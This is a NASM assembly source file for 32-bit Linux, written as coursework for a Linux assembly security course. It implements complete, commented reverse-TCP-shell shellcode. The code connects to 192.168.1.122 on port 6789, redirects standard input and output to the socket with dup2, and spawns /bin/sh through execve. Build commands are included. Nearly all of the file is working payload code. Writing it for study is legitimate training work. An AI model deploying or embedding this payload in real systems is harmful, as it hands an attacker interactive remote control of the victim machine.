; Creates a reverse TCP shell against 192.168.1.122 on port 6789 that spawns /bin/sh
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 rev_shell_asm.nasm -o rev_shell_asm.o
; ld rev_shell_asm.o -o rev_shell_asm

global _start			

section .text
_start:
    ; socket
    xor eax, eax        ; zero out eax
    mov ebx, eax        ; zero out ebx
    push eax            ; push 0 to stack (protocol: 0 (nonblocking))
    mov al, 0x66        ; socketcall
    mov bl, 1           ; sys_socket
    push ebx            ; push 1 to stack (type: SOCK_STREAM)
    push 2              ; domain: AF_INET
    mov ecx, esp        ; save pointer to stack
    int 0x80

    ; connect
    mov edi,eax         ; save sockfd
    mov al,0x66         ; socketcall
    mov bl,3            ; connect
    push 0x7a01a8c0     ; ip address (192.168.1.122)
    push word 0x851a    ; port number (6789)
    push word 2         ; AF_INET
    mov ecx,esp         ; save pointer to struct
    push 0x10           ; push struct length
    push ecx            ; push pointer to struct
    push edi            ; push sockfd
    mov ecx,esp         ; save pointer to stack
    int 0x80

    ; dup2
    xor ecx,ecx         ; zero out ecx
    mov ebx,edi
    mov al, 0x3f        ; dup2
dup2_loop:
    int 0x80            
    mov al,0x3f         ; dup2
    inc ecx             ; increment ecx until we hit 2
    cmp ecx, 2          ; test if we're at 2
    jle dup2_loop       ; if not, keep calling dup2

    ; execve
    mov al,0xb          ; execve
    xor edx,edx         ; zero out edx
    push edx            ; push edx to stack to terminate string
    push 0x68732f6e     ; n/sh
    push 0x69622f2f     ; //bi
    mov ebx, esp        ; save pointer to stack to ecx
    mov ecx, edx        ; argv[]
    ;mov edx, edx       ; envp[]
    int 0x80

    ; close
    mov al,6            ; close
    mov ebx,edi         ; sockfd
    int 0x80
